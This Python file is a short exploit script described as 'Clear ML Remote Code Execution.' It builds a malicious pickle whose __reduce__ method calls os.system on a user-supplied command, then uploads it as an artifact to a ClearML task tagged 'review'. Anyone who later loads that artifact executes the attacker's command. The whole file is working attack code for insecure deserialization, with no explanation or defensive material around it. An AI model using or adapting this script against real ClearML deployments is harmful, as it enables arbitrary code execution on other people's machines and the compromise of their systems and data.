import pickle
import os
from clearml import Task
import argparse


def parse_args()->argparse.Namespace:
    """
    Get arguments from the user
    """
    parser = argparse.ArgumentParser(description="Clear ML Remote Code Execution.")
    parser.add_argument('-c', '--command', required=True, help='Command to run on the target machine')

    return parser.parse_args()


class RunCommand:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (str(self.command),))


def main()->None:
    print("[+] Creating task...")
    # Create the task
    task = Task.init(project_name='Black Swan', task_name='Exploit', tags=["review"])
    # Get the command from the user
    args: argparse.Namespace = parse_args()
    # Create the command class
    command = RunCommand(args.command)
    # Name the pickle file
    pickle_filename: str = 'exploit_pickle.pkl'
    # Create the file with the command
    print("[+] Creating pickle file...")
    with open(pickle_filename, 'wb') as f:
        pickle.dump(command, f)
    # Upload the command
    print("[+] Uploading pickle file as artifact...")
    task.upload_artifact(name=pickle_filename.replace('.pkl',''), artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
    print("[+] Done")

if __name__ == "__main__":
    main()
